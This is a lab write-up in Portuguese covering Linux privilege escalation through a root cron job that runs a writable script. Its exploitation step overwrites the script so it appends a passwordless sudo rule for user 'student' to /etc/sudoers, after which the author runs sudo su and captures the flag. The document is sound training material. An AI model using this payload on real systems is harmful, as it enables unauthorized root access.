
## Objetivo

Explorar um **cron job executado como root** que utiliza um **script gravável** para obter **Privilege Escalation**.

---

## Reconhecimento

### Verificar conectividade

```bash
ping -c4 target.ine.local
```

Target acessível.

---

### Serviço exposto

Acessar no navegador:

```
http://target.ine.local:8000
```

Interface de terminal Linux disponível.

---

## Enumeração Inicial

Listar arquivos no diretório home:

```bash
ls -l
```

Observação:

- Arquivo `message`
    
- Permissão apenas para root
    
- Usuário `student` não consegue ler
    

---

## Buscar Arquivo com Mesmo Nome

```bash
find / -name message 2>/dev/null
```

Resultado relevante:

```
/tmp/message
```

---

## Verificar Comportamento do Arquivo

```bash
ls -l /tmp/
```

Observação:

- Arquivo sendo sobrescrito periodicamente
    
- Indício de cron job copiando arquivo
    

---

## Localizar Script Responsável

Buscar referência ao arquivo `/tmp/message`:

```bash
grep -nri "/tmp/message" /usr 2>/dev/null
```

Resultado:

```
/usr/local/share/copy.sh
```

---

## Analisar Script

Ver permissões:

```bash
ls -l /usr/local/share/copy.sh
```

Observação:

- Script gravável pelo usuário `student`
    

Ver conteúdo:

```bash
cat /usr/local/share/copy.sh
```

Conclusão:

- Script copia arquivo
    
- Executado por cron como root
    
- Vulnerável a modificação
    

---

## Problema

Não há editor de texto disponível:

```bash
vim /usr/local/share/copy.sh
vi /usr/local/share/copy.sh
nano /usr/local/share/copy.sh
```

Todos indisponíveis.

---

## Exploração

Substituir conteúdo do script usando `printf`:

```bash
printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh
```

Verificar alteração:

```bash
cat /usr/local/share/copy.sh
```

Payload:

- Adiciona usuário `student` ao sudoers
    
- Sem necessidade de senha
    

---

## Aguardar Execução do Cron

Verificar permissões sudo:

```bash
sudo -l
```

Aguardar até 1 minuto (execução do cron).

Nova permissão:

```
(student) NOPASSWD: ALL
```

---

## Escalar Privilégio

```bash
sudo su
```

Agora como root.

---

## Capturar Flag

```bash
cd /root
ls -l
cat flag
```

Flag:

```
697914df7a07bb9b718c8ed258150164
```

---

## Vetor de Vulnerabilidade

- Cron job executando como root
    
- Script gravável por usuário comum
    
- Execução periódica automática
    

---

## Fluxo de Exploração

1. Identificar arquivo inacessível
    
2. Encontrar cópia em `/tmp`
    
3. Detectar comportamento periódico
    
4. Localizar script responsável
    
5. Verificar permissões graváveis
    
6. Inserir payload
    
7. Aguardar cron
    
8. Ganhar sudo
    
9. Escalar para root
    

---

## Indicadores de Vulnerabilidade

- script executado por root
    
- permissões world-writable
    
- execução periódica
    
- ausência de caminho absoluto seguro
    

---

## Comandos Utilizados

```bash
ping -c4 target.ine.local
ls -l
find / -name message
ls -l /tmp/
grep -nri "/tmp/message" /usr
ls -l /usr/local/share/copy.sh
cat /usr/local/share/copy.sh
printf 'payload' > script
sudo -l
sudo su
```

---

## Técnica

Cron Job Writable Script → Privilege Escalation

---

## Resumo

Um cron job executado como root utilizava um script gravável. O script foi modificado para adicionar o usuário ao `/etc/sudoers`, permitindo escalonamento de privilégio para root.

---